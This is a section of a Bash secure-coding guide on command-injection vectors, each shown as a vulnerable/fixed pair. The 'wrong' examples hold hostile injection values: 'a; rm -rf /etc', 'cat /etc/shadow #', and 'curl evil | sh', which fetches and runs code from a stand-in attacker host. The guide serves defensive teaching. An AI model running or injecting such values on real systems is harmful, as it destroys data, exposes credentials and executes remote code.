<!-- SPDX-License-Identifier: CC-BY-SA-4.0 -->
## 20.5 Command injection vectors

Command injection is the central footgun of shell programming: attacker-
controlled data becomes attacker-executed code. The vectors below catalogue
the principal ways data crosses into the parser. Each is given as a
vulnerable/fixed pair and ends with the canonical allow-list-then-positional
pattern that retires the entire class.

### Vector 1 — Unquoted expansion

```bash
# scenario: copy a user-named log into archive
# wrong — unquoted $logfile is word-split, then pathname-expanded
cp $logfile /var/archive/
# attacker supplies: 'a; rm -rf /etc'
# ⇒ shell sees: cp a ; rm -rf /etc /var/archive/
```

Word splitting and pathname expansion (BCS0301) operate on the *result* of
parameter expansion, so the attacker's metacharacters become tokens before
`cp` sees them.

```bash
# scenario: same operation, quoted and `--` terminated
cp -- "$logfile" /var/archive/      # ⇒ a single argument, even with spaces or ;
```

Quoting blocks splitting but does not validate content; a filename of `-rf`
or `../etc/passwd` still reaches `cp`. Quoting is necessary, never
sufficient.

### Vector 2 — `find -exec sh -c` with interpolated input

```bash
# scenario: walk a directory and run a transform on each file
# wrong — $user_cmd is interpolated into the inner shell
find . -type f -exec sh -c "$user_cmd \"\$0\"" {} \;
# attacker supplies user_cmd='cat /etc/shadow #'
# ⇒ inner sh runs:  cat /etc/shadow #"$0"
```

The `find -exec sh -c` idiom invites injection because the inner shell
re-parses the string. Passing arguments positionally to a fixed inner script
sidesteps re-parsing entirely.

```bash
# scenario: positional pass-through; inner sh does not see user content
mkdir -p _demo && : > _demo/a.txt && : > _demo/b.txt
find _demo -type f -exec sh -c '
  for f; do
    printf "processed: %s\n" "$f"   # stand-in for `process_one -- "$f"`
  done
' sh {} +                           # → {} are passed as "$@", not re-parsed
# ⇒ processed: _demo/a.txt
# ⇒ processed: _demo/b.txt
# (no cleanup — illustrative; in real code remove the demo tree afterwards)
```

The `sh` after `-c '…'` becomes `$0`; subsequent `{}` arrive as positional
arguments. No interpolation, no re-parse.

### Vector 3 — `eval` over input

```bash
# scenario: parse a key=value config string supplied by user
# wrong — eval re-parses
eval "$cfg_line"                    # cfg_line='X=1; curl evil | sh'
# ⇒ shell executes the trailing pipeline
```

The fix is to parse without `eval` — split on `=`, validate the key,
validate the value, then assign or store (§20.4):

```bash
# scenario: same config-line parse, no eval
[[ $cfg_line =~ ^([A-Z_][A-Z0-9_]*)=(.*)$ ]] || die 22 'bad config'
declare -- k=${BASH_REMATCH[1]} v=${BASH_REMATCH[2]}
declare -A cfg=()
cfg[$k]=$v                          # ⇒ key validated, value stored as data
```

### Vector 4 — Embedded interpreter (`bash -c`, `ssh remote-cmd`, `xargs sh -c`)

Every embedded interpreter is a fresh injection surface. `ssh host "cmd $x"`
re-parses on the *remote* host; `xargs -I{}` interpolates blindly. The fix
is identical to Vector 2: pass data as positional arguments, never as
in-line script text.

```bash
# wrong — remote shell re-parses
ssh host "rm -- $remote_path"

# scenario: remote shell receives a fixed script with positional args
printf -- '%s\0' "$remote_path" \
  | ssh host 'xargs -0 -I{} rm -- "{}"'   # ⇒ no interpolation on either side
```

### The canonical fix — allow-list, then positional

The only pattern that retires the entire class is to validate input against
an allow-list (BCS1005), then pass it as a positional argument to a fixed
command. The validator's regex defines the safe subset; everything else is
rejected with a non-zero exit (BCS0602).

```bash
# scenario: download a named asset; name comes from caller
download_asset() {
  local -- name=$1
  [[ $name =~ ^[a-z][a-z0-9_-]{0,63}$ ]] \
    || { error "invalid asset name: ${name@Q}"; return 22; }
  curl --fail --silent --output "$ASSET_DIR/$name" \
    -- "https://assets.example.com/$name"
}
```

The validator does three things: it caps length (defends against buffer-
adjacent attacks downstream), pins the alphabet (no `..`, no `/`, no `;`),
and anchors with `^…$` (no prefix or suffix injection). The data then flows
to `curl` as a positional argument, never as part of a string the shell
re-parses.

**See also**: §20.4 eval avoidance, §20.6 input validation, §20.12
sanitising filenames, BCS1004, BCS1005, BCS0301.

#fin
